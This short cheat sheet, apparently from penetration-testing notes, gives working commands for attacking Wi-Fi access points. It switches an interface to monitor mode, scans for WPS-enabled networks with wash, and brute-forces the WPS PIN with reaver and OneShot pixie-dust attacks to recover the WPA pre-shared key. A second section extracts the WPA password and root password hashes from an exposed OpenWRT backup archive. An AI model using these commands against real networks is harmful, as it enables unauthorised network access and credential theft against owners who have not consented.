# WiFi WPS PIN Brute Force (reaver)

When access to a wireless interface is available (on-target or via SSH to a router/AP), brute-force the WPS PIN to recover the WPA pre-shared key.

```bash
# Check for wireless interfaces and monitor mode capability
iwconfig
iw dev

# Switch interface to monitor mode
sudo ip link set <IFACE> down
sudo iw dev <IFACE> set type monitor
sudo ip link set <IFACE> up

# Scan for WPS-enabled networks
wash -i <IFACE>
# Look for WPS Locked: No — locked means WPS lockout is active (reaver will fail)

# Brute force WPS PIN
reaver -i <IFACE> -b <BSSID> -vv
# If WPS is not locked and hardware is cooperative, recovers PSK in minutes to hours

# OneShot (faster, pixie-dust attack where supported):
python3 oneshot.py -i <IFACE> -b <BSSID> -K  # pixie-dust
python3 oneshot.py -i <IFACE> -b <BSSID> -F  # full brute force

# Once PSK recovered, use it to connect / check for password reuse
```

## OpenWRT backup credential extraction

FTP or file-share may expose an OpenWRT backup archive (`/etc/openwrt_backup` or `.tar.gz`):
```bash
tar -xvf backup.tar.gz
cat etc/config/wireless   # contains psk= (WPA password)
cat etc/passwd            # root hash or cleartext creds
```
